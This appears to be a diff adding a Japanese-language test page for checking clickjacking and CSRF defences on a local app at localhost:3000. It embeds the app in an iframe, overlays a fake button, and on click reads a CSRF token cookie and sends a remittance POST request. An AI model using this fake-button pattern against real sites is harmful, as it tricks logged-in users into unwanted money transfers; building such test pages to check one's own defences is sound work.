@@ -1,0 +1,149 @@
+<!doctype html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>クリックジャグリング検証</title>
+  </head>
+  <body>
+    <h1>クリックジャグリング検証用ページ</h1>
+    <ul>
+      <li>
+        ユーザーがログイン後、クッキーにログイン情報が保存されている状態で、Iframeが表示されるか確認します。
+      </li>
+      <li>Iframe内にあるフォームを使用して、ログイン後にリクエストを送信できるか確認します。</li>
+      <li>他のサービスで認証が有効な場合、リクエストが実行されるか確認します。</li>
+    </ul>
+
+    <div
+      style="
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        flex-direction: column;
+      "
+    >
+      l
+      <p id="auth-status"></p>
+      <script>
+        async function updateAuthStatus() {
+          const statusElement = document.getElementById("auth-status");
+          try {
+            const response = await fetch("http://localhost:3000/csrf/check_auth");
+            if (!response.ok) {
+              throw new Error("ネットワークの応答が正常ではありません");
+            }
+            const authStatus = await response.text();
+            console.log(authStatus);
+            statusElement.textContent = authStatus;
+          } catch (error) {
+            console.error("認証状態の取得に失敗しました:", error);
+            statusElement.textContent = "認証状態の取得に失敗しました。";
+          }
+        }
+
+        // ページ読み込み時に認証状態を更新
+        document.addEventListener("DOMContentLoaded", updateAuthStatus);
+      </script>
+      <iframe src="http://localhost:3000/csrf_test.html" width="300px" height="300px"></iframe>
+
+      <!-- クリックジャグリングのための偽ボタン -->
+      <div class="fake-button">
+        <h2>偽ボタン</h2>
+        <button>クリック</button>
+      </div>
+
+      <style>
+        .fake-button {
+          position: absolute;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          width: 100%;
+          height: 100%;
+          padding: 20px;
+          background-color: #f8f9fa;
+          border: 1px solid #ddd;
+          border-radius: 8px;
+          box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+          margin-top: 20px;
+          transition:
+            transform 0.2s,
+            box-shadow 0.2s;
+        }
+
+        .fake-button:hover {
+          transform: translateY(-5px);
+          box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        .fake-button h2 {
+          margin: 0 0 10px 0;
+          font-size: 18px;
+          color: #333;
+        }
+
+        .fake-button button {
+          width: 100%;
+          padding: 10px;
+          background-color: #007bff;
+          color: white;
+          border: none;
+          border-radius: 4px;
+          cursor: pointer;
+          transition: background-color 0.2s;
+        }
+
+        .fake-button button:hover {
+          background-color: #0056b3;
+        }
+      </style>
+
+      <script>
+        function getCookie(name) {
+          const value = `; ${document.cookie}`;
+          const parts = value.split(`; ${name}=`);
+          if (parts.length === 2) return parts.pop().split(";").shift();
+        }
+
+        async function sendMoney() {}
+
+        document.querySelector(".fake-button").addEventListener("click", async () => {
+          console.log("クリックされました");
+
+          try {
+            const csrfTokenForCookie = getCookie("csrfToken");
+            console.log("CSRFトークン:", csrfTokenForCookie);
+
+            const response = await fetch("http://localhost:3000/csrf/check_auth", {
+              method: "GET",
+              headers: {
+                "Content-Type": "application/json",
+                "X-CSRF-Token": csrfTokenForCookie || "",
+              },
+            });
+
+            if (response.status !== 200) {
+              const errorText = await response.text();
+              throw new Error(`送金リクエストが失敗しました: ${errorText}`);
+            }
+
+            const sendResponse = await fetch("http://localhost:3000/limit/remit", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                "X-CSRF-Token": csrfTokenForCookie || "",
+              },
+            });
+
+            console.log("送金成功:", sendResponse);
+          } catch (error) {
+            console.error("送金に失敗しました:", error);
+          }
+        });
+      </script>
+    </div>
+  </body>
+</html>
